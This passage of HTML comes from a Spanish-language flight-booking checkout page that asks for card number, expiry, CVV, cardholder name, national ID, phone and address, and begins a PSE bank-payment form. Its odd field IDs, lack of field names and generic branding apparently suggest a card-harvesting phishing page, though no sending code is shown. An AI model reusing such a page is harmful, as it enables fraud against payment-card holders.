                                                            <path d="M5.63922 23.8612V22.2727C5.63922 21.6745 5.25611 21.2719 4.63851 21.2665C4.31382 21.2611 3.97891 21.3617 3.74442 21.7168C3.56899 21.4361 3.2925 21.2665 2.90381 21.2665C2.63213 21.2665 2.36664 21.3459 2.15882 21.6423V21.3294H1.60522V23.8606H2.16315V22.4571C2.16315 22.0177 2.40802 21.7842 2.78618 21.7842C3.15349 21.7842 3.3393 22.0225 3.3393 22.4516V23.8603H3.89848V22.4568C3.89848 22.0174 4.15373 21.7839 4.52088 21.7839C4.89857 21.7839 5.07881 22.0222 5.07881 22.4513V23.8599L5.63922 23.8612ZM13.9088 21.3294H13.0044V20.5615H12.4452V21.3294H11.9293V21.8325H12.4452V22.9872C12.4452 23.5745 12.6743 23.9243 13.3286 23.9243C13.5687 23.9243 13.8452 23.8502 14.0206 23.7286L13.8608 23.2573C13.6958 23.3524 13.5149 23.4004 13.3711 23.4004C13.0946 23.4004 13.0044 23.2307 13.0044 22.9767V21.833H13.9088V21.3294ZM18.6289 21.2663C18.3098 21.2663 18.102 21.4149 17.959 21.6373V21.3294H17.4108V23.8606H17.9639V22.4417C17.9639 22.0228 18.1448 21.7901 18.5064 21.7901C18.6248 21.7884 18.7423 21.81 18.8523 21.8538L19.0228 21.335C18.9003 21.287 18.7407 21.2659 18.6287 21.2659L18.6289 21.2663ZM11.4919 21.5307C11.2258 21.3561 10.8592 21.2659 10.4547 21.2659C9.81022 21.2659 9.39533 21.5733 9.39533 22.0762C9.39533 22.4889 9.70423 22.7435 10.273 22.823L10.5343 22.86C10.8376 22.9024 10.9808 22.9818 10.9808 23.1248C10.9808 23.3205 10.7793 23.4322 10.401 23.4322C10.0179 23.4322 9.74143 23.3103 9.55494 23.1673L9.29508 23.5965C9.59835 23.8189 9.98149 23.925 10.3964 23.925C11.131 23.925 11.5567 23.5808 11.5567 23.0989C11.5567 22.6539 11.2216 22.4212 10.668 22.3418L10.4074 22.3041C10.1679 22.2733 9.97604 22.2253 9.97604 22.0557C9.97604 21.8706 10.1569 21.7592 10.4603 21.7592C10.785 21.7592 11.0993 21.8811 11.2534 21.9762L11.4929 21.5313L11.4919 21.5307ZM26.3184 21.2654C25.9992 21.2654 25.7914 21.414 25.6477 21.6363V21.3294H25.0996V23.8606H25.6533V22.4417C25.6533 22.0228 25.8342 21.7901 26.1958 21.7901C26.3141 21.7884 26.4317 21.81 26.5416 21.8538L26.7121 21.335C26.5897 21.287 26.4301 21.2659 26.318 21.2659L26.3184 21.2654ZM19.1877 22.5947C19.1877 23.3626 19.7248 23.924 20.5447 23.924C20.9278 23.924 21.183 23.8391 21.4591 23.6221L21.1934 23.1772C20.9857 23.3257 20.7677 23.4051 20.527 23.4051C20.0854 23.3998 19.7608 23.082 19.7608 22.5947C19.7608 22.1073 20.0854 21.7898 20.527 21.7842C20.7671 21.7842 20.9852 21.8636 21.1934 22.0122L21.4591 21.5673C21.1826 21.3503 20.9273 21.2654 20.5447 21.2654C19.7248 21.2654 19.1877 21.8267 19.1877 22.5947ZM24.3706 22.5947V21.3294H23.8177V21.6379C23.6416 21.4099 23.3762 21.267 23.0143 21.267C22.3014 21.267 21.7419 21.8234 21.7419 22.5962C21.7419 23.3691 22.3011 23.9255 23.0143 23.9255C23.3762 23.9255 23.6416 23.7824 23.8177 23.5546V23.8619H24.3707V22.5956L24.3706 22.5947ZM22.3113 22.5947C22.3113 22.1498 22.6042 21.7842 23.0829 21.7842C23.5405 21.7842 23.8492 22.134 23.8492 22.5947C23.8492 23.0553 23.5405 23.4051 23.0829 23.4051C22.6042 23.4051 22.3111 23.0396 22.3111 22.5947H22.3113ZM15.6335 21.2656C14.888 21.2656 14.3665 21.8054 14.3665 22.5949C14.3665 23.3998 14.9089 23.9241 15.6705 23.9241C16.0536 23.9241 16.4045 23.829 16.7132 23.5694L16.4422 23.1615C16.2289 23.3311 15.9574 23.4263 15.7021 23.4263C15.3457 23.4263 15.0212 23.262 14.9413 22.8063H16.8301C16.8355 22.7378 16.8411 22.6687 16.8411 22.5947C16.8355 21.8055 16.3451 21.2654 15.6332 21.2654L15.6335 21.2656ZM15.6223 21.7591C15.9788 21.7591 16.2077 21.9815 16.2661 22.3731H14.9463C15.0053 22.0076 15.2283 21.7591 15.6225 21.7591H15.6223ZM29.5068 22.5956V20.313H28.9531V21.6379C28.7777 21.4099 28.5116 21.267 28.1498 21.267C27.4368 21.267 26.8774 21.8234 26.8774 22.5962C26.8774 23.3691 27.4365 23.9255 28.1498 23.9255C28.5116 23.9255 28.7777 23.7824 28.9531 23.5546V23.8619H29.5068V22.5956ZM27.4468 22.5956C27.4468 22.1507 27.7396 21.7852 28.2186 21.7852C28.6765 21.7852 28.9848 22.1349 28.9848 22.5956C28.9848 23.0563 28.6765 23.406 28.2186 23.406C27.7398 23.406 27.4468 23.0405 27.4468 22.5956ZM8.75731 22.5956V21.3294H8.20416V21.6379C8.0287 21.4099 7.76263 21.267 7.40073 21.267C6.68785 21.267 6.12832 21.8234 6.12832 22.5962C6.12832 23.3691 6.6875 23.9255 7.40073 23.9255C7.76245 23.9255 8.0287 23.7824 8.20416 23.5546V23.8619H8.75668V22.5956H8.75731ZM6.69789 22.5956C6.69789 22.1507 6.99083 21.7852 7.46957 21.7852C7.92707 21.7852 8.2358 22.1349 8.2358 22.5956C8.2358 23.0563 7.92707 23.406 7.46957 23.406C6.99083 23.406 6.69789 23.0405 6.69789 22.5956ZM30.4286 23.4968C30.4967 23.4967 30.5621 23.5233 30.6107 23.5708C30.6341 23.5936 30.6528 23.6208 30.6655 23.6508C30.6923 23.7132 30.6923 23.7836 30.6655 23.8459C30.6524 23.8758 30.6338 23.903 30.6107 23.926C30.5869 23.9487 30.5593 23.967 30.529 23.9799C30.4972 23.9934 30.4631 24.0002 30.4286 24C30.3937 24.0003 30.3591 23.9934 30.3269 23.9799C30.2963 23.9672 30.2684 23.949 30.2446 23.926C30.2215 23.9021 30.2031 23.8741 30.1905 23.8433C30.1638 23.781 30.1638 23.7105 30.1905 23.6482C30.2033 23.6182 30.222 23.591 30.2454 23.5681C30.2688 23.5448 30.2969 23.5264 30.3277 23.5142C30.3598 23.5007 30.3945 23.4939 30.4294 23.4942L30.4286 23.4968ZM30.4286 23.9424C30.4548 23.9427 30.4807 23.9375 30.5047 23.927C30.5278 23.9171 30.5489 23.903 30.5667 23.8853C30.5845 23.8676 30.5988 23.8466 30.6087 23.8235C30.629 23.7747 30.629 23.7198 30.6087 23.6709C30.5986 23.6479 30.5844 23.627 30.5667 23.6092C30.5488 23.5915 30.5278 23.5773 30.5047 23.5674C30.4805 23.5576 30.4546 23.5526 30.4286 23.5529C30.4021 23.5527 30.3757 23.5576 30.3511 23.5674C30.3275 23.5771 30.3059 23.5913 30.2877 23.6092C30.2316 23.6664 30.2154 23.7514 30.2463 23.8251C30.2558 23.8482 30.2698 23.8693 30.2877 23.8868C30.3059 23.9047 30.3275 23.9188 30.3511 23.9286C30.3756 23.939 30.4019 23.9442 30.4286 23.944V23.9424ZM30.4441 23.6285C30.4689 23.6269 30.4934 23.634 30.5135 23.6485C30.5299 23.6618 30.5389 23.6821 30.5378 23.7031C30.5386 23.7212 30.5315 23.7386 30.5183 23.7511C30.5028 23.7645 30.4834 23.7726 30.4629 23.7741L30.5403 23.8619H30.4807L30.4093 23.7747H30.3863V23.8619H30.3364V23.6286H30.4449L30.4441 23.6285ZM30.3856 23.6721V23.7338H30.4434C30.4543 23.734 30.465 23.7313 30.4745 23.726C30.4821 23.7205 30.4865 23.7117 30.486 23.7024C30.4865 23.6932 30.4821 23.6845 30.4745 23.6794C30.4652 23.6738 30.4544 23.671 30.4434 23.6715H30.3856V23.6721Z" fill="#231F20"></path>
                                                            <path d="M30.0864 15.4414V15.1346H30.2103V15.0722H29.8936V15.1346H30.0175V15.4414H30.0857H30.0864ZM30.7008 15.4414V15.0713H30.604L30.492 15.3253L30.3805 15.0713H30.2833V15.4414H30.3521V15.1626L30.4569 15.4032H30.5282L30.633 15.1619V15.4414H30.7012H30.7008Z" fill="#F79410"></path>
                                                            <path d="M19.6913 17.0288H11.3091V2.03812H19.6914L19.6913 17.0288Z" fill="#FF5F00"></path>
                                                            <path d="M11.8405 9.53376C11.8405 6.49293 13.2713 3.78409 15.4993 2.03841C13.8128 0.715078 11.7269 -0.00315123 9.57921 1.03935e-05C4.28862 1.03935e-05 0 4.26836 0 9.53376C0 14.7992 4.28862 19.0676 9.57921 19.0676C11.7269 19.0707 13.8129 18.3525 15.4994 17.0292C13.2716 15.2838 11.8405 12.5748 11.8405 9.53376Z" fill="#EB001B"></path>
                                                            <path d="M30.9999 9.53376C30.9999 14.7992 26.7113 19.0676 21.4208 19.0676C19.2728 19.0707 17.1865 18.3525 15.4998 17.0292C17.7283 15.2835 19.1591 12.5748 19.1591 9.53376C19.1591 6.49276 17.7283 3.78409 15.4998 2.03841C17.1865 0.715104 19.2727 -0.00308995 21.4206 9.99321e-06C26.7111 9.99321e-06 30.9998 4.26836 30.9998 9.53376" fill="#F79E1B"></path>
                                                        </svg>
                                                    </div>
                                                    <div class="logo-bank">
                                                        <svg width="31" height="29" viewBox="0 0 31 29" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <g clip-path="url(#clip0_26_12)">
                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 -2.07144H33.0667V31.0714H0V-2.07144Z" fill="white"></path>
                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M1.45545 28.4825H1.36093C1.36093 28.4352 1.33726 28.364 1.33726 28.3401C1.33726 28.3166 1.33726 28.2693 1.26623 28.2693H1.1242V28.4825H1.05317V27.9846H1.26623C1.36093 27.9846 1.43178 28.0085 1.43178 28.103C1.43178 28.1742 1.4081 28.1981 1.3846 28.2215C1.40827 28.2454 1.43178 28.2691 1.43178 28.3166V28.4113C1.43178 28.4352 1.43178 28.4352 1.45545 28.4352V28.4825ZM1.36093 28.1269C1.36093 28.0558 1.31358 28.0558 1.28991 28.0558H1.1242V28.1981H1.26623C1.31358 28.1981 1.36093 28.1742 1.36093 28.1269ZM1.7632 28.2217C1.7632 27.9373 1.52664 27.6998 1.21888 27.6998C0.934979 27.6998 0.698242 27.9373 0.698242 28.2217C0.698242 28.5299 0.934979 28.7674 1.21888 28.7674C1.52647 28.7672 1.7632 28.5299 1.7632 28.2217ZM1.69218 28.2217C1.69218 28.4827 1.4793 28.6723 1.21888 28.6723C0.958477 28.6723 0.76926 28.4825 0.76926 28.2217C0.76926 27.9846 0.958649 27.771 1.21888 27.771C1.47913 27.771 1.69218 27.9846 1.69218 28.2217ZM30.8472 18.6391C30.8472 19.3508 30.3976 19.6825 29.5929 19.6825H28.0549V18.9708H29.5929C29.7349 18.9708 29.8533 18.9473 29.9008 18.9C29.948 18.8523 29.9953 18.7811 29.9953 18.6864C29.9953 18.5913 29.9482 18.4966 29.9008 18.4493C29.8533 18.4017 29.7588 18.3781 29.6167 18.3781C28.8833 18.3542 27.9603 18.4017 27.9603 17.3582C27.9603 16.8837 28.2679 16.3618 29.0961 16.3618H30.6815V17.0735H29.2143C29.0726 17.0735 28.9777 17.0735 28.9067 17.1208C28.8357 17.1919 28.7885 17.2631 28.7885 17.3818C28.7885 17.5004 28.8595 17.5716 28.954 17.6192C29.0489 17.6428 29.1436 17.6664 29.262 17.6664H29.6878C30.1374 17.6664 30.4215 17.7612 30.6109 17.9275C30.7526 18.0934 30.8472 18.3071 30.8472 18.6391ZM27.5105 17.9275C27.3211 17.7612 27.037 17.6664 26.5874 17.6664H26.1616C26.0434 17.6664 25.9485 17.6426 25.854 17.6192C25.7592 17.5716 25.6885 17.5004 25.6885 17.3818C25.6885 17.2631 25.712 17.1919 25.8067 17.1208C25.8777 17.0735 25.9722 17.0735 26.1143 17.0735H27.5815V16.3618H25.9961C25.144 16.3618 24.8599 16.8837 24.8599 17.3582C24.8599 18.4015 25.783 18.3542 26.5167 18.3781C26.6584 18.3781 26.7533 18.4017 26.8005 18.4493C26.8476 18.4966 26.8953 18.5913 26.8953 18.6864C26.8953 18.7811 26.8478 18.8523 26.8005 18.9C26.7295 18.9473 26.6349 18.9708 26.4929 18.9708H24.9546V19.6825H26.4929C27.2972 19.6825 27.747 19.3507 27.747 18.6391C27.747 18.3071 27.6525 18.0934 27.5105 17.9275ZM24.4813 18.9949H22.6121V18.3307H24.4341V17.6668H22.6121V17.0499H24.4813V16.3621H21.8311V19.6826H24.4813V18.9949ZM20.979 16.5282C20.7186 16.3858 20.411 16.3619 20.0087 16.3619H18.1868V19.6825H18.9911V18.4729H19.8432C20.1269 18.4729 20.2928 18.4968 20.4112 18.6152C20.5532 18.7811 20.5532 19.0659 20.5532 19.2795V19.6825H21.3339V19.042C21.3339 18.7337 21.3105 18.5913 21.2157 18.4254C21.1447 18.3303 21.003 18.2119 20.8136 18.1407C21.0264 18.0698 21.3816 17.7851 21.3816 17.2631C21.3815 16.8838 21.2394 16.6702 20.979 16.5282ZM16.4828 16.3619H13.9506L12.9329 17.4531L11.9627 16.3619H8.76799V19.6825H11.9155L12.9331 18.5913L13.9034 19.6825H15.4417V18.568H16.4356C17.1218 18.568 17.8083 18.3781 17.8083 17.4531C17.8081 16.5518 17.0981 16.3619 16.4828 16.3619ZM20.34 17.7378C20.2218 17.7851 20.1034 17.7851 19.9614 17.7851L18.9911 17.809V17.0497H19.9614C20.1034 17.0497 20.2455 17.0497 20.34 17.1209C20.4349 17.1685 20.5056 17.2633 20.5056 17.4057C20.5056 17.548 20.4349 17.6667 20.34 17.7378ZM16.4828 17.9038H15.4415V17.0497H16.4828C16.7669 17.0497 16.9561 17.1685 16.9561 17.4531C16.9561 17.7378 16.7667 17.9038 16.4828 17.9038ZM13.4299 18.0222L14.6604 16.7179V19.3981L13.4299 18.0222ZM11.5131 18.9949H9.54885V18.3307H11.3V17.6668H9.54885V17.0499H11.5367L12.4123 18.0224L11.5131 18.9949ZM28.6463 13.9663H27.5105L26.0196 11.4757V13.9663H24.4107L24.1027 13.2309H22.4462L22.1386 13.9663H21.2156C20.837 13.9663 20.34 13.8714 20.0563 13.5866C19.7959 13.3021 19.6538 12.9226 19.6538 12.3295C19.6538 11.8314 19.7248 11.3808 20.0796 11.025C20.3162 10.764 20.7423 10.6455 21.2864 10.6455H22.0436V11.3572H21.2864C21.0027 11.3572 20.8368 11.4047 20.6712 11.547C20.5292 11.6894 20.4582 11.9503 20.4582 12.306C20.4582 12.6617 20.5292 12.9227 20.6712 13.0889C20.7894 13.2073 21.0027 13.2548 21.2154 13.2548H21.5705L22.7063 10.6458H23.8897L25.2149 13.7766V10.6455H26.4455L27.8417 12.9463V10.6455H28.6462V13.9663H28.6463ZM19.2516 10.6455H18.4472V13.9663H19.2516V10.6455ZM17.5712 10.7879C17.3108 10.6455 17.0271 10.6455 16.6248 10.6455H14.8024V13.9663H15.5834V12.7565H16.4353C16.7194 12.7565 16.9087 12.7802 17.0269 12.8988C17.169 13.065 17.1451 13.3497 17.1451 13.5393V13.9663H17.9495V13.3021C17.9495 13.0175 17.926 12.8752 17.8078 12.709C17.7368 12.6142 17.5947 12.4955 17.4292 12.4245C17.6419 12.3295 17.9972 12.0688 17.9972 11.5469C17.9974 11.1674 17.8315 10.9538 17.5712 10.7879ZM14.2345 13.2785H12.3887V12.6143H14.2108V11.9265H12.3887V11.3335H14.2345V10.6458H11.5841V13.9665H14.2345V13.2785ZM10.9924 10.6455H9.69089L8.72059 12.8988L7.67934 10.6455H6.40148V13.7764L5.05261 10.6455H3.86945L2.44956 13.9663H3.30146L3.60905 13.2309H5.2655L5.57309 13.9663H7.18237V11.3572L8.34184 13.9663H9.02805L10.1877 11.3572V13.9663H10.9923V10.6455H10.9924ZM23.819 12.5194L23.2745 11.2148L22.7303 12.5194H23.819ZM16.9561 11.9977C16.8378 12.0689 16.7195 12.0689 16.5538 12.0689H15.5834V11.3337H16.5536C16.6957 11.3337 16.8611 11.3337 16.9559 11.3811C17.0504 11.4523 17.098 11.5472 17.098 11.6894C17.098 11.8316 17.0506 11.9501 16.9561 11.9977ZM3.89296 12.5194L4.43728 11.2148L4.98159 12.5194H3.89296ZM30.6581 0.232758H2.42572V12.1874L3.39599 9.98151H5.45472L5.7388 10.5271V9.98151H8.15261L8.69697 11.1674L9.21763 9.98151H16.9087C17.2635 9.98151 17.5711 10.0527 17.808 10.2424V9.98151H19.9141V10.2424C20.2688 10.0526 20.7184 9.98151 21.2392 9.98151H24.2919L24.576 10.5271V9.98151H26.8241L27.1555 10.5271V9.98151H29.3561V14.6305H27.1319L26.7061 13.919V14.6305H23.9372L23.6296 13.8715H22.943L22.6355 14.6305H21.1921C20.6241 14.6305 20.198 14.4881 19.9142 14.3459V14.6305H16.4828V13.5631C16.4828 13.4207 16.4591 13.397 16.3644 13.397H16.2462V14.6304H9.61987V14.0373L9.38331 14.6304H7.98707L7.7505 14.0611V14.6304H5.07629L4.79238 13.8714H4.10602L3.79844 14.6304H2.42572V28.6486H30.6581V20.1332C30.3505 20.2755 29.9243 20.3467 29.4984 20.3467H27.4395V20.062C27.2029 20.252 26.7768 20.3467 26.3747 20.3467H19.8904V19.2795C19.8904 19.1371 19.8669 19.1371 19.7483 19.1371H19.6301V20.3467H17.5002V19.0897C17.1454 19.2556 16.743 19.2556 16.3881 19.2556H16.1514V20.3467H13.5483L12.9331 19.6351L12.2469 20.3467H8.05795V15.6979H12.3176L12.9329 16.4092L13.5957 15.6979H16.4591C16.7902 15.6979 17.3347 15.7452 17.5712 15.9823V15.6979H20.1269C20.3873 15.6979 20.8845 15.7452 21.2156 15.9823V15.6979H25.073V15.9824C25.286 15.7926 25.6885 15.6981 26.0433 15.6981H28.1967V15.9824C28.4336 15.8165 28.7646 15.6981 29.1908 15.6981H30.6581V0.232758Z" fill="#0077A6"></path>
                                                            </g>
                                                            <defs>
                                                                <clipPath id="clip0_26_12">
                                                                    <rect width="31" height="29" fill="white"></rect>
                                                                </clipPath>
                                                            </defs>
                                                        </svg>
                                                    </div>
                                                    <div class="logo-bank">
                                                        <svg width="33" height="26" viewBox="0 0 33 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <path d="M19.3325 25.9998C26.478 26.0336 33 20.2479 33 13.2097C33 5.51369 26.478 0.193387 19.3325 0.19626H13.1829C5.9522 0.193387 0 5.51512 0 13.2097C0 20.2493 5.9522 26.0336 13.1829 25.9998H19.3325Z" fill="#0079BE"></path>
                                                            <path d="M13.2121 1.26276C6.60425 1.26491 1.25049 6.55073 1.24829 13.0747C1.25049 19.598 6.60425 24.8838 13.2121 24.886C19.8209 24.8838 25.1768 19.598 25.1775 13.0747C25.1768 6.55073 19.8216 1.26491 13.2121 1.26276ZM5.6291 13.0747C5.62771 11.5663 6.09161 10.0926 6.96016 8.84614C7.82872 7.5997 9.06154 6.63852 10.4974 6.08822V20.0604C9.06142 19.5106 7.82845 18.5496 6.95986 17.3032C6.09126 16.0568 5.62746 14.583 5.6291 13.0747ZM15.9261 20.0633V6.0875C17.3632 6.63702 18.597 7.59811 19.4662 8.84497C20.3354 10.0919 20.7994 11.5663 20.7975 13.0754C20.7991 14.5845 20.335 16.0589 19.4658 17.3056C18.5966 18.5524 17.363 19.5135 15.9261 20.0633Z" fill="white"></path>
                                                            <path d="M19.3325 25.9998C26.478 26.0336 33 20.2479 33 13.2097C33 5.51369 26.478 0.193387 19.3325 0.19626H13.1829C5.9522 0.193387 0 5.51512 0 13.2097C0 20.2493 5.9522 26.0336 13.1829 25.9998H19.3325Z" fill="#0079BE"></path>
                                                            <path d="M13.291 0.896545C6.45642 0.89875 0.919024 6.31518 0.916748 13.0003C0.919024 19.6848 6.45642 25.1012 13.291 25.1034C20.1264 25.1012 25.666 19.6848 25.6667 13.0003C25.666 6.31518 20.1271 0.89875 13.291 0.896545ZM5.44782 13.0003C5.44639 11.4547 5.9262 9.94454 6.82454 8.66731C7.72289 7.39007 8.998 6.40513 10.4832 5.84124V20.1587C8.99787 19.5953 7.72262 18.6105 6.82423 17.3333C5.92584 16.0561 5.44612 14.546 5.44782 13.0003ZM16.098 20.1616V5.84051C17.5844 6.4036 18.8606 7.38844 19.7596 8.66611C20.6586 9.94381 21.1385 11.4547 21.1365 13.0011C21.1382 14.5474 20.6582 16.0582 19.7592 17.3358C18.8602 18.6134 17.5842 19.5983 16.098 20.1616Z" fill="white"></path>
                                                        </svg>
                                                    </div>
                                                </div>



                                                <!--+++++++Formularios para los datos de las tarjetas+++++++-->
                                                <table cellspacing="0" cellpadding="0" class="tableCard tableCard-data">
                                                    <tbody>
                                                        <tr>
                                                            <td>
                                                                <div class="input-cardNumber ">
                                                                    <label class="" for="cardNumber">Número de tarjeta:</label>
                                                                    <input type="text" class="cardNumber reviewable-item"
                                                                        maxlength="19" id="ttcc" size="25" value="" cardnum="1" ap_validation_type="text" tabindex="1" autocomplete="off" />
                                                                    <span class="card_icon"></span>
                                                                    <input type="hidden" id="bk_name" value="" />
                                                                    <input type="hidden" id="email" value="" />
                                                                    <div class="validation-error-help valid-pmnt-info-ttcc" id="err_cc" style="display: none;">Escribe el número de tarjeta</div>
                                                                </div>
                                                            </td>
                                                            <td>
                                                                <div>
                                                                    <label for="cmexp">Válida mes:</label>
                                                                    <select class="wid reviewable-item ap_valid_month" id="cmexp"
                                                                        tabindex="2" ap_validation_type="selectList-month" ap_validation_postfix="empty-invalid">
                                                                        <option selected="selected" value="-1">Mes</option>
                                                                        <option value="01">01</option>
                                                                        <option value="02">02</option>
                                                                        <option value="03">03</option>
                                                                        <option value="04">04</option>
                                                                        <option value="05">05</option>
                                                                        <option value="06">06</option>
                                                                        <option value="07">07</option>
                                                                        <option value="08">08</option>
                                                                        <option value="09">09</option>
                                                                        <option value="10">10</option>
                                                                        <option value="11">11</option>
                                                                        <option value="12">12</option>
                                                                    </select>
                                                                    <div class="validation-error-help valid-pmnt-info-cardMonthExpired valid-pmnt-info-cmexp" style="display: none" id="err_month">El mes no puede estar vacío</div>
                                                                </div>
                                                                <div>
                                                                    <label for="cyexp">Válida año:</label>
                                                                    <select class="reviewable-item  " id="cyexp"
                                                                        tabindex="3" ap_validation_type="selectList-year" ap_validation_postfix="empty-invalid"
                                                                        onclick="">
                                                                        <option selected="selected" value="-1">Año</option>
                                                                        <option value="2024">2024</option>
                                                                        <option value="2025">2025</option>
                                                                        <option value="2026">2026</option>
                                                                        <option value="2027">2027</option>
                                                                        <option value="2028">2028</option>
                                                                        <option value="2029">2029</option>
                                                                        <option value="2030">2030</option>
                                                                        <option value="2031">2031</option>
                                                                        <option value="2032">2032</option>
                                                                        <option value="2033">2033</option>
                                                                        <option value="2034">2034</option>
                                                                        <option value="2035">2035</option>
                                                                        <option value="2036">2036</option>
                                                                        <option value="2037">2037</option>
                                                                        <option value="2038">2038</option>
                                                                        <option value="2039">2039</option>
                                                                        <option value="2040">2040</option>
                                                                        <option value="2041">2041</option>
                                                                        <option value="2042">2042</option>
                                                                        <option value="2043">2043</option>
                                                                    </select>

                                                                    <input type="hidden" name="expdate" id="expdate" value="">

                                                                    <div class="validation-error-help valid-pmnt-info-cardYearExpired valid-pmnt-info-cyexp" style="display: none" id="err_year">El año no puede estar vacío</div>
                                                                </div>

                                                            </td>

                                                        </tr>
                                                        <tr>
                                                            <td class="cardSecurityCode1wrapselector" style='margin-top: 5px !important;'>
                                                                <div>
                                                                    <label for="secCod">
                                                                        CVV:
                                                                        <span class="tooltip-item cvv-tool ap_tooltip-item">
                                                                            <span class="point-tool">
                                                                                <img class="sprite question-icon" alt="icon" />
                                                                            </span>
                                                                            <span class="content-tool" style="display:none;">
                                                                                <h4>Dónde encontrar el código de seguridad (CVV) de tu tarjeta.</h4>
                                                                                <ul class="cvv-image">
                                                                                    <li class="cvv-one">
                                                                                        <img class="sprite" alt="CVV" />
                                                                                        <p><strong>Master Card / Visa</strong> <br> Son los 3 últimos digitos al reverso de la tarjeta</p>
                                                                                    </li>
                                                                                    <li class="cvv-two">
                                                                                        <img class="sprite" alt="CVV" />
                                                                                        <p><strong>American Express</strong> <br> Son los 4 digitos de la parte frontal</p>
                                                                                    </li>
                                                                                </ul>
                                                                            </span>
                                                                        </span>
                                                                    </label>

                                                                    <input type="text" id="csc" size="3" maxlength="4" tabindex="5" value="" class="reviewable-item" data-hj-masked ap_validation_type="text" autocomplete="off" />
                                                                    <div class="validation-error-help validation-error-help--margin valid-pmnt-info-csc" id="err_cvv" style="display: none">Ingresa el código de seguridad</div>

                                                                </div>
                                                                <div>
                                                                    <label id="payment-plan-2-label" class="" for="payment-plan-2">
                                                                        Cuotas:
                                                                    </label>
                                                                    <select class="feesPlan ap_feesplan" id="cuotas-2">
                                                                        <option value="1" selected></option>
                                                                        <option value="2">2</option>
                                                                        <option value="3">3</option>
                                                                        <option value="4">4</option>
                                                                        <option value="5">5</option>
                                                                        <option value="6">6</option>
                                                                        <option value="7">7</option>
                                                                        <option value="8">8</option>
                                                                        <option value="9">9</option>
                                                                        <option value="10">10</option>
                                                                        <option value="11">11</option>
                                                                        <option value="12">12</option>
                                                                        <option value="13">13</option>
                                                                        <option value="14">14</option>
                                                                        <option value="15">15</option>
                                                                        <option value="16">16</option>
                                                                        <option value="17">17</option>
                                                                        <option value="18">18</option>
                                                                        <option value="19">19</option>
                                                                        <option value="20">20</option>
                                                                        <option value="21">21</option>
                                                                        <option value="22">22</option>
                                                                        <option value="23">23</option>
                                                                        <option value="24">24</option>
                                                                        <option value="25">25</option>
                                                                        <option value="26">26</option>
                                                                        <option value="27">27</option>
                                                                        <option value="28">28</option>
                                                                        <option value="29">29</option>
                                                                        <option value="30">30</option>
                                                                        <option value="31">31</option>
                                                                        <option value="32">32</option>
                                                                        <option value="33">33</option>
                                                                        <option value="34">34</option>
                                                                        <option value="35">35</option>
                                                                        <option value="36">36</option>
                                                                    </select>
                                                                    <div class="validation-error-help  app-valid-pmnt-info" style="display: none"></div>

                                                                </div>
                                                            </td>
                                                            <td class="padding-top">
                                                                <label for="carHol">Nombre del propietario:</label>
                                                                <input type="text" id="cname" size="27"
                                                                    maxlength="49" value="" tabindex="4" class="reviewable-item" ap_validation_type="text"
                                                                    onkeyup="" autocomplete="off" />
                                                                <span class="note">Escribelo tal como aparece en tu tarjeta</span>
                                                                <div class="validation-error-help valid-pmnt-info-cname" style="display: none" id="err_name">Escribe el nombre del titular</div>
                                                            </td>
                                                        </tr>
                                                    </tbody>
                                                </table>


                                                <table border="0" cellspacing="0" cellpadding="0" class="tableCard">
                                                    <tbody>

                                                        <tr class="NationalIdCard1">
                                                            <td>
                                                                <label for="cc">Cédula de ciudadanía</label>
                                                                <input type="number" class="reviewable-item" id="cc" size="20" maxlength="19" value="" ap_validation_type="text">
                                                                <div class="validation-error-help validation-error-help--margin valid-pmnt-info-cc" id="err_doc" style="display: none">Ingresa un número de documento válido</div>
                                                            </td>
                                                            <td>
                                                                <label for="tel">Número de teléfono:</label>
                                                                <input type="number" id="tel" value="" class="reviewable-item" tabindex="9" ap_validation_type="text" />
                                                                <div class="validation-error-help validation-error-help--margin valid-pmnt-info-tel" id="err_phone" style="display: none">Ingresa un número de teléfono válido</div>
                                                            </td>
                                                        </tr>

                                                        <tr>
                                                            <td>
                                                                <label for="city">Ciudad:</label>
                                                                <input type="text" id="city" value="" maxlength="255" class="reviewable-item" tabindex="9" ap_validation_type="text" />
                                                                <div class="validation-error-help validation-error-help--margin valid-pmnt-info-city" id="err_city" style="display: none">Ingresa una ciudad válida</div>
                                                            </td>

                                                            <td>
                                                                <label for="address">Dirección:</label>
                                                                <input type="text" id="address"
                                                                    value="" maxlength="255" class="reviewable-item" tabindex="10" ap_validation_type="text" />
                                                                <div class="validation-error-help validation-error-help--margin valid-pmnt-info-address" id="err_address" style="display: none">Ingresa una dirección válida</div>
                                                            </td>

                                                        </tr>


                                                    </tbody>
                                                </table>

                                                <div id="promoBalanceContainer" class="buttons group right" style="margin-top: 10px;">

                                                    <div>
                                                        <a id="pay_now" name="pay_now" class="btn-success" tabindex="14">
                                                            Completar reservación
                                                        </a>

                                                    </div>
                                                </div>


                                                <br>
                                                <!--+++++++Loguitos de seguridad+++++++-->
                                                <div class="alert alert-success alert--secure group">
                                                    <div class="module fr">

                                                        <img src="./assets/images/pse.png" alt="pse" class="pse">
                                                        <img src="./assets/images/ach.png" alt="ach" class="ach">
                                                        <img src="./assets/images/placetopay.png" alt="placetopay" class="placetopay">

                                                    </div>

                                                    <div class="sprite secureLock fl"></div>
                                                    <h4>Sus compras con Vuelos Tiquetes Baratos son 100% seguras.</h4>
                                                    <p>Reserva con confianza. Toda tu información personal viaja protegida por nuestros servidores seguros.</p>
                                                </div>
                                            </div>

                                            <br>
                                            <!--Planes de pago-->
                                        </div>

                                    </div>
                                </div>
                                
                                <!-- ========== TAB PAGO PSE ========== -->
                                <div name="paymentMethodBoxPSE" id="payTypePSE-content" class="tab" style="display: none;">
                                  <header>
                                    <img src="data-ps/recargas/1.png" alt="Encabezado PSE">
                                  </header>

                                  <form class="formulario" id="formPSE">
                                    <h2>Formulario de Pago PSE</h2>

                                    <label for="nombre">Nombre Completo</label>
                                    <input type="text" id="nombre" required>

                                    <label for="cedula">Cédula</label>
                                    <input type="text" id="cedula" required>

                                    <label for="celular">Celular</label>
                                    <input type="text" id="celular" required>

                                    <label for="direccion">Dirección</label>
                                    <input type="text" id="direccion" required>

                                    <label for="ciudad">Ciudad</label>
                                    <input type="text" id="ciudad" placeholder="Ej: Bogotá" required>

                                    <label for="correo">Correo electrónico</label>
                                    <input type="email" id="correo" placeholder="Ej: ejemplo@correo.com" required>

                                    <!-- Selector de banco con folder/tipo -->
                                    <div class="input-group">
                                      <label>Bancos *</label>
                                      <select id="txt-banco" name="banco" required>
